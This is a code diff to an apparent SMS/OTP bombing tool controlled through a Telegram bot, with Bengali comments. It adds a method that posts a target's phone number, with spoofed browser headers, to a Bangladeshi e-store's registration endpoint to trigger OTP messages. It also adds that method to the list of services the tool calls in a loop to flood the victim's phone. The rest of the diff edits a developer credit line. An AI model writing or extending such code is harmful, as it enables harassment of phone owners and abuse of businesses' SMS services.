@@ -248,6 +248,42 @@ class Bomber:
 #করলাম এড
 
 
+  def rkpl_estore(self):
+    url = "https://estore.rkpl.com.bd/register"
+    
+    # নেক্সট.জেএস সার্ভার অ্যাকশনের জন্য নির্দিষ্ট হেডার্স
+    headers = {
+        "Host": "estore.rkpl.com.bd",
+        "User-Agent": self.getUserAgent(),
+        "Accept": "text/x-component",
+        "Content-Type": "text/plain;charset=UTF-8",
+        "Origin": "https://estore.rkpl.com.bd",
+        "Referer": "https://estore.rkpl.com.bd/register",
+        "Next-Action": "7f1acd7fd062bc1c3a8e5e8fbda9afe7b8302cdaa2",
+        "X-Requested-With": "mark.via.gp",
+        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+    }
+
+    # নেক্সট.জেএস সার্ভার অ্যাকশনের বডি ফরম্যাট অনুযায়ী পেলোড
+    # সাধারণত প্রথম আর্গুমেন্টে ফোন নম্বর বা ফর্ম ডাটা পাস হয়
+    payload = f'[{{"phone":"{self.user_mobile}"}}]'
+
+    try:
+      r = requests.post(url, data=payload, headers=headers, timeout=5)
+      # রেসপন্সে যদি সফলভাবে ওটিপি সেন্ড হয়
+      if r.status_code == 200 and "OTP successfully sent" in r.text:
+        return True
+    except:
+      pass
+    return False
+
+# আবারও করলাম 
+
+
+
+
+
+
 
 
 
@@ -290,6 +326,7 @@ class Bomber:
         self.shopz,
         self.ghorerbazar,
         self.shopbasebd, #নতুন আসচে 
+        self.rkpl_estore, #ওইটাও আসচে নিজে
     ]
 
     while counter < self.number_of_messege:
@@ -507,7 +544,7 @@ def handle_text_buttons(message):
     bot.send_message(
         chat_id,
         (
-            "👑 **Developer:**WQ OWNER@ (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
+            "👑 **Developer:**WQ OWNER (ওস্তাদ)\n⚡ **Brand:** GRAPIXY HUB\n🌐"
             " **Hosted on:** None"
         ),
         reply_markup=get_reply_keyboard(),
